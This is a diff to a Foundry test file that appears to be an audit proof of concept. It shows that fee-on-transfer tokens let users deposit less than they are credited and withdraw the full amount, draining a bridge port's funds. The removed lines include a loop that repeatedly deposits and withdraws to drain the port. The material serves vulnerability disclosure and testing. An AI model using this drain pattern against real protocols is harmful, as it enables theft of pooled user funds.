@@ -6,6 +6,14 @@ import {ERC20} from "./weird-tokens/ERC20.sol";
 import {TransferFeeToken} from "./weird-tokens/TransferFeeToken.sol";
 import {StdCheatsSafe} from "forge-std/StdCheats.sol";
 
+struct Balances {
+    uint256 branchPortBalance;
+    uint256 user1Balance;
+    uint256 user2Balance;
+    uint256 user1GlobalTokenBalance;
+    uint256 user2GlobalTokenBalance;
+}
+
 contract ArbitrumBranchTest is DSTestPlus, StdCheatsSafe {
     receive() external payable {}
 
@@ -581,97 +589,166 @@ contract ArbitrumBranchTest is DSTestPlus, StdCheatsSafe {
     }
 
     // @audit Test passed for depositToPort
-    function test_FeeOnTransferTokensAreNotSupported() public {
+    function test_FeeOnTransferTokensWillCauseTheLoseOfFundsToProtocol() public {
+        console2.log("\n\tStarting test");
         uint256 fee = 10 ether;
         uint256 totalSupply = 100_000_000 ether; // 100 million
-        address user = makeAddr("Alice");
+        address user1 = makeAddr("Alice");
+        address user2 = makeAddr("Bob");
         uint256 userBalance = 1000 ether;
-        uint256 localPortBalance = 1000 ether;
         uint256 userDeposit = 100 ether;
 
+        console2.log("\t\t > Deploying Mock Fee on Transfer Token...");
         // Create new Fee on transfer token
         TransferFeeToken transferFeeToken = new TransferFeeToken(totalSupply,fee);
 
+        console2.log("\t\t > Adding the token to arbritrum root chain...");
         // Adding token to the arbitrum root chain
         _addLocalTokenArbitrum(address(transferFeeToken));
 
-        // giving some token to the user and branch port
-        transferFeeToken.transfer(user, userBalance);
-        transferFeeToken.transfer(address(localPortAddress), localPortBalance);
+        console2.log("\t\t > Transferring some tokens to Alice and Bob...");
+        // giving some tokens to the user1 and user2 and branch port
+        transferFeeToken.transfer(user1, userBalance);
+        transferFeeToken.transfer(user2, userBalance);
 
-        // checking user got the correct balance
-        require(transferFeeToken.balanceOf(user) == (userBalance - fee), "invalid balance");
+        // checking user got the correct balance after fee payment
+        require(transferFeeToken.balanceOf(user1) == (userBalance - fee), "invalid balance");
+        require(transferFeeToken.balanceOf(user2) == (userBalance - fee), "invalid balance");
 
-        // getting balances before
-        uint256 branchPortBalanceBefore = transferFeeToken.balanceOf(address(localPortAddress));
-        uint256 userBalanceBefore = transferFeeToken.balanceOf(address(user));
-        uint256 userBalanceBeforeHToken = MockERC20(newArbitrumAssetGlobalAddress).balanceOf(user);
+        // getting balances before Deposit
+        Balances memory balancesBeforeDeposit = Balances({
+            branchPortBalance: transferFeeToken.balanceOf(address(localPortAddress)),
+            user1Balance: transferFeeToken.balanceOf(address(user1)),
+            user2Balance: transferFeeToken.balanceOf(address(user2)),
+            user1GlobalTokenBalance: MockERC20(newArbitrumAssetGlobalAddress).balanceOf(user1),
+            user2GlobalTokenBalance: MockERC20(newArbitrumAssetGlobalAddress).balanceOf(user2)
+        });
 
+        console2.log("\n\t\t > Balances after transferring tokens:");
+        console2.log("\t\t\t > Fee on transfer token balances");
+        console2.log("\t\t\t\t > Alice: %s", balancesBeforeDeposit.user1Balance);
+        console2.log("\t\t\t\t > Bob: %s", balancesBeforeDeposit.user2Balance);
+        console2.log("\t\t\t\t > ArbitrumBranchPort: %s", balancesBeforeDeposit.branchPortBalance);
+        console2.log("\t\t\t > Global htoken balances");
+        console2.log("\t\t\t\t > Alice: %s", balancesBeforeDeposit.user1GlobalTokenBalance);
+        console2.log("\t\t\t\t > Bob: %s\n", balancesBeforeDeposit.user2GlobalTokenBalance);
+
+        console2.log("\t\t > Alice and Bob deposit to port");
+        // user 1 deposit to the port
+        _depositToPort(user1, transferFeeToken, userDeposit);
+
+        // user2 deposit to the port
+        _depositToPort(user2, transferFeeToken, userDeposit);
+
+        // getting balances after deposit
+        Balances memory balancesAfterDeposit = Balances({
+            branchPortBalance: transferFeeToken.balanceOf(address(localPortAddress)),
+            user1Balance: transferFeeToken.balanceOf(address(user1)),
+            user2Balance: transferFeeToken.balanceOf(address(user2)),
+            user1GlobalTokenBalance: MockERC20(newArbitrumAssetGlobalAddress).balanceOf(user1),
+            user2GlobalTokenBalance: MockERC20(newArbitrumAssetGlobalAddress).balanceOf(user2)
+        });
+
+        console2.log("\n\t\t > Balances after depositing to port:");
+        console2.log("\t\t\t > Fee on transfer token balances");
+        console2.log("\t\t\t\t > Alice: %s", balancesAfterDeposit.user1Balance);
+        console2.log("\t\t\t\t > Bob: %s", balancesAfterDeposit.user2Balance);
+        console2.log("\t\t\t\t > ArbitrumBranchPort: %s", balancesAfterDeposit.branchPortBalance);
+        console2.log("\t\t\t > Global token balances");
+        console2.log("\t\t\t\t > Alice: %s", balancesAfterDeposit.user1GlobalTokenBalance);
+        console2.log("\t\t\t\t > Bob: %s\n", balancesAfterDeposit.user2GlobalTokenBalance);
+
+        // balance of branch port should be increased by 180 (100 deposit token - fee -> per person)
+        require(
+            balancesAfterDeposit.branchPortBalance - balancesBeforeDeposit.branchPortBalance == 2 * (userDeposit - fee),
+            "invalid port balance"
+        );
+        require(
+            balancesBeforeDeposit.user1Balance - balancesAfterDeposit.user1Balance == userDeposit,
+            "invalid user1 balance"
+        );
+        require(
+            balancesBeforeDeposit.user2Balance - balancesAfterDeposit.user2Balance == userDeposit,
+            "invalid user2 balance"
+        );
+        require(
+            balancesAfterDeposit.user1GlobalTokenBalance - balancesBeforeDeposit.user1GlobalTokenBalance == userDeposit,
+            "invalid user1 global token balance"
+        );
+        require(
+            balancesAfterDeposit.user2GlobalTokenBalance - balancesBeforeDeposit.user2GlobalTokenBalance == userDeposit,
+            "invalid user2 blobal token balance"
+        );
+
+        console2.log("\t\t > Alice withdraw from port");
+        // user1 withdraws his tokens
+        _withdrawFromPort(user1, address(newArbitrumAssetGlobalAddress), userDeposit);
+
+        // balances after withdrawl of user1
+        Balances memory balancesAfterWithdrawlUser1 = Balances({
+            branchPortBalance: transferFeeToken.balanceOf(address(localPortAddress)),
+            user1Balance: transferFeeToken.balanceOf(address(user1)),
+            user2Balance: transferFeeToken.balanceOf(address(user2)),
+            user1GlobalTokenBalance: MockERC20(newArbitrumAssetGlobalAddress).balanceOf(user1),
+            user2GlobalTokenBalance: MockERC20(newArbitrumAssetGlobalAddress).balanceOf(user2)
+        });
+
+        console2.log("\n\t\t > Balances after withdrawl of tokens by Alice:");
+        console2.log("\t\t\t > Fee on transfer token balances");
+        console2.log("\t\t\t\t > Alice: %s", balancesAfterWithdrawlUser1.user1Balance);
+        console2.log("\t\t\t\t > Bob: %s", balancesAfterWithdrawlUser1.user2Balance);
+        console2.log("\t\t\t\t > ArbitrumBranchPort: %s", balancesAfterWithdrawlUser1.branchPortBalance);
+        console2.log("\t\t\t > Global token balances");
+        console2.log("\t\t\t\t > Alice: %s", balancesAfterWithdrawlUser1.user1GlobalTokenBalance);
+        console2.log("\t\t\t\t > Bob: %s\n", balancesAfterWithdrawlUser1.user2GlobalTokenBalance);
+
+        // branch port should have lost tokens again
+        require(
+            balancesAfterDeposit.branchPortBalance - balancesAfterWithdrawlUser1.branchPortBalance == userDeposit,
+            "invalid port balance"
+        );
+
+        // user1 balance of token should be increased by userDeposit
+        require(
+            balancesAfterWithdrawlUser1.user1Balance - balancesAfterDeposit.user1Balance == userDeposit - fee,
+            "invalid user1 balance"
+        );
+
+        // there should not be any change in the user2 balance
+        require(
+            balancesAfterDeposit.user2Balance - balancesAfterWithdrawlUser1.user2Balance == 0, "invalid user2 balance"
+        );
+
+        // user 1 should not have any global token left
+        require(balancesAfterWithdrawlUser1.user1GlobalTokenBalance == 0, "invalid user1 global token balance");
+
+        // user2 balance of global token should not be changed
+        require(
+            balancesAfterDeposit.user2GlobalTokenBalance - balancesAfterWithdrawlUser1.user2GlobalTokenBalance == 0,
+            "invalid user2 blobal token balance"
+        );
+        console2.log("\n\t Test Passed");
+    }
+
+    function _withdrawFromPort(address user, address globalTokenAddress, uint256 userDeposit) internal {
         hevm.startPrank(user);
-        // approving arbtirum branch bridge agent
+
+        // trying to withdraw the token to the port
+        arbitrumCoreBridgeAgent.withdrawFromPort(globalTokenAddress, userDeposit);
+        hevm.stopPrank();
+    }
+
+    function _depositToPort(address user, TransferFeeToken transferFeeToken, uint256 userDeposit) internal {
+        hevm.startPrank(user);
+        // user2 approving arbtirum branch bridge agent
         transferFeeToken.approve(address(localPortAddress), userDeposit);
 
+        // allowance should be appropriate
         require(transferFeeToken.allowance(user, address(localPortAddress)) == userDeposit, "invalid allowance");
 
         // trying to deposit the token to the port
         arbitrumCoreBridgeAgent.depositToPort(address(transferFeeToken), userDeposit);
         hevm.stopPrank();
-
-        // getting balances after
-        // getting balances before
-        uint256 branchPortBalanceAfter = transferFeeToken.balanceOf(address(localPortAddress));
-        uint256 userBalanceAfter = transferFeeToken.balanceOf(address(user));
-        uint256 userBalanceAfterHToken = MockERC20(newArbitrumAssetGlobalAddress).balanceOf(user);
-
-        // balance of branch port should be increased 90 (100 deposit token - fee)
-        require(branchPortBalanceAfter - branchPortBalanceBefore == userDeposit - fee, "invalid balance");
-
-        // balance of user for the token should be 900 (balance before(1000) - deposit(100))
-        require(userBalanceBefore - userBalanceAfter == userDeposit, "invalid balance");
-
-        // balance of user for the h token should be increased by 100 while the actual deposit was 90 token
-        require(userBalanceAfterHToken - userBalanceBeforeHToken == userDeposit, "invalid balance");
-
-        // user now withdraw his balance
-
-        hevm.startPrank(user);
-
-        // trying to withdraw the token to the port
-        arbitrumCoreBridgeAgent.withdrawFromPort(address(newArbitrumAssetGlobalAddress), userDeposit);
-        hevm.stopPrank();
-
-        // after withdraw user should get 90 tokens back as port will pay 10 tokens fee for transfer
-        // total tokens = balance after deposit (900) + deposit (100) - fee (10) = 990
-        require(transferFeeToken.balanceOf(address(user)) == userBalanceAfter + userDeposit - fee, "invalid balance");
-
-        // local port has lost 10 tokens
-        // tokens_after_deposit = balance before depsit(1000) + deposit(100) - fee(10) = 1090
-        // tokens_after_withdraw = tokens_after_deposit(1090) - withdrawn_balance(100) = 990 (fee will not be accounted here since user has 100 htoken)
-        require(
-            transferFeeToken.balanceOf(address(localPortAddress)) == branchPortBalanceAfter - userDeposit,
-            "invalid balance"
-        );
-
-        // using same strategy again and again, user can drain most of the protocl funds
-        // this scenario is very rare and costly. We know that in order to execute this type
-        // of attack user will have to pay insane amount of fee. This is just for demonstrating
-        // the effect of the issue
-
-        // the check is done to make sure that the localPortAddress has enough token to execute the attack
-        while (transferFeeToken.balanceOf(address(localPortAddress)) > 110 ether) {
-            hevm.startPrank(user);
-
-            // approving arbtirum branch bridge agent
-            transferFeeToken.approve(address(localPortAddress), userDeposit);
-            require(transferFeeToken.allowance(user, address(localPortAddress)) == userDeposit, "invalid allowance");
-
-            // trying to deposit the token to the port
-            arbitrumCoreBridgeAgent.depositToPort(address(transferFeeToken), userDeposit);
-
-            // trying to withdraw the token to the port
-            arbitrumCoreBridgeAgent.withdrawFromPort(address(newArbitrumAssetGlobalAddress), userDeposit);
-            hevm.stopPrank();
-        }
     }
 
     function _addLocalTokenArbitrum(address _token) public {
@@ -687,29 +764,6 @@ contract ArbitrumBranchTest is DSTestPlus, StdCheatsSafe {
         uint256 balanceBefore = MockERC20(wrappedNativeToken).balanceOf(address(coreBridgeAgent));
 
         newArbitrumAssetGlobalAddress = RootPort(rootPort).getLocalTokenFromUnderlying(address(_token), rootChainId);
-
-        console2.log("New root hToken Address: ", newArbitrumAssetGlobalAddress);
-
-        console2.log(RootPort(rootPort).getGlobalTokenFromLocal(address(_token), rootChainId));
-
-        // require(
-        //     RootPort(rootPort).getGlobalTokenFromLocal(address(_token), rootChainId)
-        //         == address(newArbitrumAssetGlobalAddress),
-        //     "Token should be added"
-        // );
-
-        // require(
-        //     RootPort(rootPort).getLocalTokenFromGlobal(newArbitrumAssetGlobalAddress, rootChainId) == address(_token),
-        //     "Token should be added"
-        // );
-        // require(
-        //     RootPort(rootPort).getUnderlyingTokenFromLocal(address(newArbitrumAssetGlobalAddress), rootChainId)
-        //         == address(_token),
-        //     "Token should be added"
-        // );
-
-        // console2.log("Balance Before: ", balanceBefore);
-        // console2.log("Balance After: ", address(coreBridgeAgent).balance);
     }
 
     // @audit checking
